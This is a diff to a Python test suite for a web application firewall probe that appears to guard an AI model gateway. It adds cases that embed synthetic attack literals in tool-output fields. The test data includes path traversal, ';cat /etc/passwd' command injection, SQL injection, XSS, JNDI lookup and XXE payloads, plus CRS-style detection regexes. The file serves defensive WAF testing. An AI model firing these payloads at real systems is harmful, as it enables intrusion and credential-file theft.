@@ -714,6 +714,76 @@ class WafProbeTests(unittest.TestCase):
             self.assertEqual(report["selected_case_count"], len(probe.jndi_field_probes(self.routes)))
             self.assertTrue(all("jndi" in item["case_id"] for item in report["results"]))
 
+    def test_responses_tool_output_regressions_use_native_history_and_separate_boundaries(self):
+        cases = probe.responses_tool_output_probes(self.routes)
+        self.assertEqual(len(cases), 15)
+        self.assertEqual(cases, probe.responses_tool_output_probes(self.routes))
+        self.assertEqual(len(cases), len({case.case_id for case in cases}))
+        self.assertTrue(all(case.target == "gateway" and case.method == "POST" for case in cases))
+        self.assertTrue(all(case.auth_mode == "anonymous" for case in cases))
+        self.assertLess(max(len(case.body) for case in cases), 2048)
+        for case in cases:
+            self.assertFalse({name.lower() for name, _ in case.headers} & {"api-key", "authorization", "cookie"})
+            self.assertEqual(probe.json_bytes(json.loads(case.body)), case.body)
+            self.assertFalse(json.loads(case.body)["store"])
+            self.assertEqual(probe.expected_boundary(case),
+                             "application_reject" if case.intent == "validation" else
+                             "waf_block" if case.intent == "attack_control" else "waf_transit")
+
+        for family, literal in (
+            ("http-request-line", "Synthetic HTTP access log:\r\nGET /synthetic HTTP/1.1\r\nHost: example.invalid\r\n\r\n"),
+            ("java-source", "Review inert Java source: java.lang.Runtime.getRuntime();"),
+        ):
+            selected = {case.category.removeprefix("responses-tool-output-" + family): case
+                        for case in cases if case.category.startswith("responses-tool-output-" + family)}
+            self.assertEqual(set(selected), {"", "-sibling", "-unknown", "-model", "-query-id", "-query-collision", "-neighbor"})
+            output = selected[""]
+            self.assertEqual(output.payload_field, "input[].output[].text")
+            self.assertEqual(output.path, "/models/openai/v1/responses")
+            body = json.loads(output.body)
+            call, result = body["input"][1:3]
+            self.assertEqual(call["type"], "function_call")
+            self.assertEqual(result["type"], "function_call_output")
+            self.assertEqual(call["call_id"], result["call_id"])
+            self.assertEqual(result["output"], [{"type": "input_text", "text": literal}])
+            self.assertEqual(body["input"][-1]["role"], "user")
+            self.assertEqual(body["model"], probe.INVALID_MODEL)
+            sibling = json.loads(selected["-sibling"].body)["input"][2]["output"][0]
+            self.assertEqual(sibling["text_extra"], literal)
+            self.assertEqual(sibling["text"], "Synthetic tool result")
+            self.assertEqual(json.loads(selected["-unknown"].body)["_attack"], literal)
+            self.assertEqual(json.loads(selected["-model"].body)["model"], literal)
+            self.assertEqual(selected["-query-id"].query, (("id", literal),))
+            self.assertEqual(selected["-query-collision"].query, (("input.output.text", literal),))
+            self.assertEqual(json.loads(selected["-query-id"].body)["input"][2]["output"][0]["text"], "Synthetic tool result")
+            self.assertEqual(selected["-neighbor"].path, output.path + "/neighbor")
+            self.assertEqual(selected["-neighbor"].body, output.body)
+        http = next(case for case in cases if case.category == "responses-tool-output-http-request-line")
+        self.assertIn(b"HTTP/1.1\\r\\nHost:", http.body)
+        self.assertNotIn(b"\r\n", http.body)
+        # CRS 3.2 rule 921110 requires a newline before the request line;
+        # 944250 targets Java Runtime/ProcessBuilder, not an arbitrary JNDI call.
+        # Check parsed JSON text, the value actually inspected after decoding.
+        # https://github.com/coreruleset/coreruleset/tree/v3.2.0/rules
+        self.assertRegex(json.loads(http.body)["input"][2]["output"][0]["text"],
+                         r"(?i)[\n\r]+get\s+[^\s]+(?:\s+http|[\r\n])")
+        java = next(case for case in cases if case.category == "responses-tool-output-java-source")
+        self.assertRegex(json.loads(java.body)["input"][2]["output"][0]["text"],
+                         r"(?i)java\b.+(?:runtime|processbuilder)")
+        header = next(case for case in cases if case.category == "responses-tool-output-header")
+        self.assertEqual(header.payload_field, "header:Referer")
+        self.assertEqual(dict(header.headers)["Referer"], probe.CONTROL_REFERER_XSS)
+        with self.assertRaisesRegex(ValueError, "exactly"):
+            probe.responses_tool_output_probes([route for route in self.routes if not route.path.endswith("/responses")])
+
+    def test_responses_tool_output_cases_remain_mandatory_in_smoke_incident_and_exhaustive(self):
+        required = {case.case_id for case in probe.responses_tool_output_probes(self.routes)}
+        for cases in (probe.required_corpus(self.routes), probe.incident_corpus(self.routes),
+                      probe.required_corpus(self.routes, exhaustive=True)):
+            with self.subTest(size=len(cases)):
+                self.assertTrue(required <= {case.case_id for case in cases})
+                self.assertTrue(all(case.mandatory for case in cases if case.case_id in required))
+
     def test_ai_coding_corpus_is_bounded_anonymous_and_keeps_its_controls(self):
         cases = probe.ai_coding_probes(self.routes)
         self.assertLessEqual(len(cases), 288)
@@ -1159,7 +1229,7 @@ class WafProbeTests(unittest.TestCase):
         cases = probe.adversarial_content(self.routes)
         self.assertGreaterEqual(len(cases), 120)
         counts = Counter((case.target, case.path) for case in cases)
-        self.assertEqual(set(counts.values()), {6})
+        self.assertEqual(set(counts.values()), {8})
         self.assertIn(("gateway", "/models/openai/v1/chat/completions"), counts)
         self.assertIn(("gateway", "/tools/pii-v1-mcp/mcp"), counts)
         self.assertIn(("portal", "/api/models/generate"), counts)
@@ -1176,7 +1246,9 @@ class WafProbeTests(unittest.TestCase):
         expected = {"literal-lfi": "../../etc/passwd", "literal-rce": ";cat /etc/passwd",
             "literal-sqli": "1' OR '1'='1' UNION SELECT NULL--", "literal-xss": "<img src=x onerror=alert(1)>",
             "literal-jndi": "${jndi:ldap://waf-probe.invalid/synthetic}",
-            "literal-xxe": '<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'}
+            "literal-xxe": '<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>',
+            "literal-http-log": "Synthetic HTTP access log:\r\nGET /synthetic HTTP/1.1\r\nHost: example.invalid\r\n\r\n",
+            "literal-java": "Review inert Java source: java.lang.Runtime.getRuntime();"}
         for case in cases:
             with self.subTest(case=case.case_id):
                 self.assertEqual(case.category, "extended-content-literal-attack-documentation")
@@ -1186,6 +1258,10 @@ class WafProbeTests(unittest.TestCase):
                 self.assertNotIn("xml", dict(case.headers)["Content-Type"])
                 label = next(label for label in expected if label in case.case_id)
                 literal = "Analyze the following inert source text: " + expected[label]
+                if case.payload_field == "sdp":
+                    # A single SDP attribute cannot contain an embedded newline.
+                    # This is SDP compatibility, not a 921110 signature canary.
+                    literal = literal.replace("\r", " ").replace("\n", " ")
                 if dict(case.headers)["Content-Type"] == "application/json":
                     value = json.loads(case.body)
                     self.assertTrue(any(literal in text for text in strings(value)))
